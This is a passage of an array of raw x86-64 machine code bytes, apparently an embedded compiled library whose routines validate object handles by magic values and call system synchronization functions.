    0xFF, 0x15, 0x0A, 0x27, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0xEB, 0x2E, 0x8B, 0xC2, 0x45, 0x0F, 0xB6,
    0xC8, 0x48, 0x83, 0xC1, 0x08, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x69, 0xC0, 0xF0, 0xD8, 0xFF,
    0xFF, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20,
    0xFF, 0x15, 0xDA, 0x26, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0x45, 0x85, 0xDB, 0x74, 0x45, 0x41, 0x81,
    0xEB, 0xC0, 0x00, 0x00, 0x00, 0x74, 0x2C, 0x41, 0x83, 0xEB, 0x41, 0x74, 0x26, 0x41, 0x83, 0xFB,
    0x01, 0x74, 0x10, 0xB8, 0xE0, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4,
    0x30, 0x5B, 0xC3, 0xB8, 0xD8, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4,
    0x30, 0x5B, 0xC3, 0xB8, 0xD9, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4,
    0x30, 0x5B, 0xC3, 0x8B, 0x0B, 0xB8, 0x95, 0xFE, 0xFF, 0xFF, 0x81, 0xF9, 0x10, 0x11, 0x60, 0x19,
    0x0F, 0x44, 0xC7, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x75, 0x0B, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x8B, 0x01, 0x3D, 0x10, 0x11, 0x60, 0x19,
    0x75, 0xEC, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x33, 0xFF, 0x83, 0xFA, 0xFF, 0x75, 0x1C, 0x48, 0x83,
    0xC1, 0x08, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x89, 0x7C, 0x24, 0x20, 0xFF,
    0x15, 0x2B, 0x26, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0xEB, 0x2D, 0x8B, 0xC2, 0x48, 0x83, 0xC1, 0x08,
    0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x69, 0xC0, 0xF0, 0xD8, 0xFF, 0xFF, 0x48,
    0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0x15,
    0xFC, 0x25, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0x45, 0x85, 0xDB, 0x74, 0x45, 0x41, 0x81, 0xEB, 0xC0,
    0x00, 0x00, 0x00, 0x74, 0x2C, 0x41, 0x83, 0xEB, 0x41, 0x74, 0x26, 0x41, 0x83, 0xFB, 0x01, 0x74,
    0x10, 0xB8, 0xE0, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0xB8, 0xD8, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0xB8, 0xD9, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0x8B, 0x0B, 0xB8, 0x95, 0xFE, 0xFF, 0xFF, 0x81, 0xF9, 0x10, 0x11, 0x60, 0x19, 0x0F, 0x44,
    0xC7, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x75, 0x0B, 0xB8, 0xFE,
    0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0x8B, 0x01, 0x3D, 0x10, 0x11, 0x60, 0x19,
    0x75, 0xEC, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x33, 0xFF, 0x83, 0xFA, 0xFF, 0x75, 0x1C, 0x48, 0x83,
    0xC1, 0x08, 0x41, 0xB1, 0x01, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x89, 0x7C, 0x24, 0x20, 0xFF,
    0x15, 0x4B, 0x25, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0xEB, 0x2D, 0x8B, 0xC2, 0x48, 0x83, 0xC1, 0x08,
    0x41, 0xB1, 0x01, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x69, 0xC0, 0xF0, 0xD8, 0xFF, 0xFF, 0x48,
    0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0x15,
    0x1C, 0x25, 0x00, 0x00, 0x44, 0x8B, 0xD8, 0x45, 0x85, 0xDB, 0x74, 0x45, 0x41, 0x81, 0xEB, 0xC0,
    0x00, 0x00, 0x00, 0x74, 0x2C, 0x41, 0x83, 0xEB, 0x41, 0x74, 0x26, 0x41, 0x83, 0xFB, 0x01, 0x74,
    0x10, 0xB8, 0xE0, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0xB8, 0xD8, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0xB8, 0xD9, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0x8B, 0x0B, 0xB8, 0x95, 0xFE, 0xFF, 0xFF, 0x81, 0xF9, 0x10, 0x11, 0x60, 0x19, 0x0F, 0x44,
    0xC7, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0xB9, 0x40, 0x00,
    0x00, 0x00, 0xE8, 0x99, 0x0F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x75, 0x0E, 0x8D,
    0x43, 0xF8, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xC7, 0x00, 0x02,
    0x01, 0x92, 0x18, 0xC7, 0x40, 0x08, 0x01, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x4B, 0x20,
    0x8D, 0x50, 0x01, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x43, 0x10, 0x89, 0x43, 0x18, 0xFF, 0x15, 0x45,
    0x24, 0x00, 0x00, 0x48, 0x89, 0x1F, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x33, 0xC0, 0x48, 0x83, 0xC4,
    0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x75, 0x0A, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83,
    0xC4, 0x28, 0xC3, 0x81, 0x39, 0x02, 0x01, 0x92, 0x18, 0x75, 0xEE, 0xF0, 0x83, 0x01, 0x01, 0xE8,
    0x7C, 0x0F, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x19, 0x81, 0x39, 0x02, 0x01, 0x92, 0x18, 0x75,
    0x11, 0x48, 0x83, 0xC1, 0x08, 0xFF, 0x15, 0xFD, 0x23, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4,
    0x28, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x19, 0x81, 0x39, 0x02, 0x01, 0x92, 0x18, 0x75,
    0x11, 0x48, 0x83, 0xC1, 0x08, 0xFF, 0x15, 0xD5, 0x23, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4,
    0x28, 0xC3, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x83, 0x79, 0x08, 0x08, 0x0F, 0x94, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x48, 0x85, 0xC9, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x48,
    0x0F, 0x44, 0xD8, 0x49, 0x8B, 0xF9, 0x49, 0x8B, 0xF0, 0x48, 0x8B, 0xCB, 0x8B, 0xEA, 0xE8, 0x8D,
    0x0E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x14, 0xC7, 0x00, 0x10, 0x12, 0x61, 0x19, 0x89, 0x58,
    0x04, 0x89, 0x68, 0x08, 0x48, 0x89, 0x78, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x8B, 0x5C, 0x24,
    0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x0F, 0x83, 0x01, 0x01, 0xC7, 0x41, 0x08, 0x09,
    0x00, 0x00, 0x00, 0xE8, 0x78, 0x0E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x20, 0x8B, 0x79, 0x24, 0x48, 0x8B, 0xF2, 0x48, 0x8B, 0xD9, 0x3B, 0x79, 0x20,
    0x72, 0x25, 0x48, 0x8B, 0x49, 0x28, 0x8D, 0x6F, 0x20, 0x8B, 0xD5, 0x48, 0xC1, 0xE2, 0x03, 0xE8,
    0x2C, 0x0F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x07, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0xEB, 0x19,
    0x48, 0x89, 0x43, 0x28, 0x89, 0x6B, 0x20, 0x48, 0x8B, 0x43, 0x28, 0x48, 0x89, 0x34, 0xF8, 0x83,
    0x43, 0x24, 0x01, 0x48, 0x89, 0x5E, 0x20, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B,
    0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC,
    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x35, 0x48,
    0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x48, 0x23, 0xC2, 0x48,
    0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x1B, 0x81, 0x39, 0x10, 0x12, 0x61, 0x19, 0x75,
    0x13, 0x8B, 0x41, 0x08, 0x85, 0xC0, 0x7E, 0x0C, 0x83, 0xF8, 0x09, 0x7D, 0x07, 0x83, 0xF8, 0x08,
    0x0F, 0x94, 0xC0, 0xC3, 0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x42, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x72, 0x33, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B,
    0xC1, 0x48, 0x23, 0xC2, 0x48, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x19, 0x81, 0x39,
    0x10, 0x12, 0x61, 0x19, 0x75, 0x11, 0x8B, 0x41, 0x08, 0x85, 0xC0, 0x7E, 0x0A, 0x83, 0xF8, 0x09,
    0x7D, 0x05, 0x48, 0x8B, 0x41, 0x18, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x72, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x72, 0x63, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B,
    0xC1, 0x48, 0x23, 0xC2, 0x48, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x49, 0x81, 0x39,
    0x10, 0x12, 0x61, 0x19, 0x75, 0x41, 0x8B, 0x41, 0x08, 0x85, 0xC0, 0x7E, 0x3A, 0x83, 0xF8, 0x09,
    0x7D, 0x35, 0x83, 0xF8, 0x08, 0x75, 0x07, 0x48, 0x83, 0x79, 0x30, 0xFF, 0x75, 0x24, 0x83, 0xF8,
    0x04, 0x75, 0x07, 0x48, 0x83, 0x79, 0x30, 0xFF, 0x75, 0x18, 0x83, 0xF8, 0x06, 0x75, 0x07, 0x48,
    0x83, 0x79, 0x30, 0xFF, 0x75, 0x0C, 0x83, 0xF8, 0x07, 0x75, 0x0C, 0x48, 0x83, 0x79, 0x30, 0xFF,
    0x74, 0x05, 0x48, 0x8B, 0x41, 0x18, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x42, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x72, 0x33, 0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B,
    0xC1, 0x48, 0x23, 0xC2, 0x48, 0x3B, 0xC2, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x19, 0x81, 0x39,
    0x10, 0x12, 0x61, 0x19, 0x75, 0x11, 0x8B, 0x41, 0x08, 0x85, 0xC0, 0x7E, 0x0A, 0x83, 0xF8, 0x09,
    0x7D, 0x05, 0x48, 0x8B, 0x41, 0x10, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x5D, 0x49,
    0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC0, 0x49,
    0x3B, 0xC0, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x43, 0x81, 0x39, 0x10, 0x12, 0x61, 0x19, 0x75,
    0x3B, 0x8B, 0x41, 0x08, 0x85, 0xC0, 0x7E, 0x34, 0x83, 0xF8, 0x09, 0x7D, 0x2F, 0x4C, 0x8B, 0x41,
    0x10, 0x49, 0xC1, 0xE8, 0x0C, 0x49, 0x3B, 0xD0, 0x72, 0x07, 0x74, 0x20, 0x49, 0x3B, 0xD0, 0x73,
    0x1B, 0x83, 0xF8, 0x03, 0x75, 0x0C, 0x48, 0xC1, 0xE2, 0x0C, 0x48, 0x03, 0x51, 0x30, 0x48, 0x8B,
    0xC2, 0xC3, 0x83, 0xF8, 0x05, 0x74, 0xEF, 0xE9, 0x44, 0x1B, 0x00, 0x00, 0xB8, 0xFF, 0xFF, 0xFF,
    0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0x75, 0x08, 0x33, 0xC0,
    0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00,
    0x20, 0x00, 0x00, 0x72, 0x22, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48,
    0x8B, 0xC3, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x08, 0x81,
    0x3B, 0x10, 0x12, 0x61, 0x19, 0x74, 0x0B, 0xB8, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20,
    0x5B, 0xC3, 0x8B, 0x43, 0x08, 0x85, 0xC0, 0x7E, 0xEE, 0x83, 0xF8, 0x09, 0x7D, 0xE9, 0x83, 0xF8,
    0x08, 0x48, 0x89, 0x74, 0x24, 0x30, 0x48, 0x89, 0x7C, 0x24, 0x38, 0x74, 0x73, 0x83, 0x7B, 0x24,
    0x00, 0x76, 0x6D, 0x84, 0xD2, 0x75, 0x15, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24,
    0x38, 0xB8, 0xBD, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x33, 0xF6, 0x66, 0x90,
    0x83, 0x43, 0x24, 0xFF, 0x48, 0x8B, 0x43, 0x28, 0x8B, 0x4B, 0x24, 0x48, 0x8B, 0x3C, 0xC8, 0x48,
    0x89, 0x34, 0xC8, 0x81, 0x3F, 0x10, 0x12, 0x61, 0x19, 0x0F, 0x85, 0x11, 0x01, 0x00, 0x00, 0x8B,
    0x47, 0x08, 0x85, 0xC0, 0x0F, 0x8E, 0xD6, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x09, 0x0F, 0x8D, 0xCD,
    0x00, 0x00, 0x00, 0x83, 0xF8, 0x08, 0x0F, 0x85, 0x94, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8,
    0x4C, 0x0D, 0x00, 0x00, 0x85, 0xC0, 0x44, 0x8B, 0xD8, 0x78, 0x5C, 0x39, 0x73, 0x24, 0x77, 0xB0,
    0x48, 0x8B, 0xCB, 0xE8, 0x38, 0x0D, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xF8, 0x0F, 0x88, 0x9C, 0x01,
    0x00, 0x00, 0x83, 0x7B, 0x08, 0x08, 0x0F, 0x85, 0x77, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x43, 0x20,
    0x41, 0x81, 0x38, 0x10, 0x12, 0x61, 0x19, 0x0F, 0x84, 0xDA, 0x00, 0x00, 0x00, 0x66, 0x66, 0x90,
    0x4C, 0x8D, 0x0D, 0x09, 0x35, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC2, 0x34, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x93, 0x34, 0x00, 0x00, 0xBA, 0x67, 0x01, 0x00, 0x00, 0xE8, 0x01, 0x9E, 0xFF, 0xFF, 0xE8,
    0x9C, 0x1C, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0x8B, 0x4B, 0x24, 0x48, 0x8B, 0x43, 0x28, 0x48, 0x8B,
    0x74, 0x24, 0x30, 0x48, 0x89, 0x3C, 0xC8, 0x83, 0x43, 0x24, 0x01, 0x48, 0x8B, 0x7C, 0x24, 0x38,
    0x41, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x4C, 0x8D, 0x0D, 0xB9, 0x34, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x72, 0x34, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x23, 0x34, 0x00, 0x00, 0xBA, 0x4A, 0x01, 0x00, 0x00, 0xE8, 0xB1, 0x9D, 0xFF, 0xFF, 0xE8,
    0x4C, 0x1C, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x4C, 0x8D, 0x0D, 0x89, 0x34, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x42, 0x34, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x9B, 0x33, 0x00, 0x00, 0xBA, 0x49, 0x01, 0x00, 0x00, 0xE8, 0x81, 0x9D, 0xFF, 0xFF, 0xE8,
    0x1C, 0x1C, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x4C, 0x8D, 0x0D, 0x59, 0x34, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x12, 0x34, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0x3B, 0x33, 0x00, 0x00, 0xBA, 0x48, 0x01, 0x00, 0x00, 0xE8, 0x51, 0x9D, 0xFF, 0xFF, 0xE8,
    0xEC, 0x1B, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0x41, 0x8B, 0x40, 0x08, 0x85, 0xC0, 0x0F, 0x8E, 0xBF,
    0x00, 0x00, 0x00, 0x83, 0xF8, 0x09, 0x0F, 0x8D, 0xB6, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x08, 0x75,
    0x27, 0x4C, 0x8D, 0x0D, 0x18, 0x34, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD1, 0x33, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0xDA, 0x32, 0x00, 0x00, 0xBA, 0x69, 0x01, 0x00, 0x00, 0xE8, 0x10, 0x9D, 0xFF, 0xFF,
    0xE8, 0xAB, 0x1B, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0x4D, 0x63, 0x48, 0x24, 0x45, 0x85, 0xC9, 0x75,
    0x27, 0x4C, 0x8D, 0x0D, 0xE8, 0x33, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xA1, 0x33, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x82, 0x32, 0x00, 0x00, 0xBA, 0x6A, 0x01, 0x00, 0x00, 0xE8, 0xE0, 0x9C, 0xFF, 0xFF,
    0xE8, 0x7B, 0x1B, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0x4D, 0x8B, 0x50, 0x28, 0x49, 0x8B, 0xC9, 0x4B,
    0x8D, 0x14, 0xCA, 0x48, 0x83, 0xEA, 0x08, 0x83, 0xC1, 0xFF, 0x48, 0x39, 0x1A, 0x74, 0x31, 0x85,
    0xC9, 0x75, 0xF0, 0x48, 0x8B, 0x4B, 0x28, 0x83, 0x03, 0x01, 0xC7, 0x43, 0x08, 0x09, 0x00, 0x00,
    0x00, 0xE8, 0x8A, 0x09, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0x82, 0x09, 0x00, 0x00, 0x48, 0x8B,
    0x74, 0x24, 0x30, 0x8B, 0xC7, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3,
    0x41, 0x8D, 0x41, 0xFF, 0x41, 0x89, 0x40, 0x24, 0x49, 0x8B, 0x04, 0xC2, 0x49, 0x89, 0x04, 0xCA,
    0xEB, 0xC1, 0x4C, 0x8D, 0x0D, 0x67, 0x33, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x20, 0x33, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0xA9, 0x31, 0x00, 0x00, 0xBA, 0x68, 0x01, 0x00, 0x00, 0xE8, 0x5F, 0x9C, 0xFF,
    0xFF, 0xE8, 0xFA, 0x1A, 0x00, 0x00, 0xCC, 0xEB, 0xD9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8D, 0x8A, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x39, 0x49, 0xBA, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x1F, 0x48, 0x85, 0xD2, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x49, 0x3B, 0xD1, 0x77, 0xF5, 0x49, 0x8B,
    0xD1, 0xE9, 0x1A, 0x0D, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8D, 0x8A, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x39, 0x49, 0xBA, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x1F, 0x48, 0x85, 0xD2, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x49, 0x3B, 0xD1, 0x77, 0xF5, 0x49, 0x8B,
    0xD1, 0xE9, 0x1A, 0x18, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8D, 0x8A, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81,
    0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x72, 0x39, 0x49, 0xBA, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC1, 0x49, 0x23, 0xC2, 0x49, 0x3B, 0xC2,
    0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x1F, 0x48, 0x85, 0xD2, 0x48, 0xC7, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x75, 0x06, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0xC3, 0x49, 0x3B, 0xD1, 0x77, 0xF5, 0x49, 0x8B,
    0xD1, 0xE9, 0x4A, 0x0E, 0x00, 0x00, 0xB8, 0xFA, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
    0x8B, 0xC2, 0x48, 0x8B, 0xF2, 0x48, 0x8B, 0xD9, 0x25, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x81, 0xE6,
    0x00, 0xF0, 0xFF, 0xFF, 0x4A, 0x8D, 0xBC, 0x00, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x81, 0x00,
    0x10, 0x00, 0x00, 0x48, 0x81, 0xE7, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00,
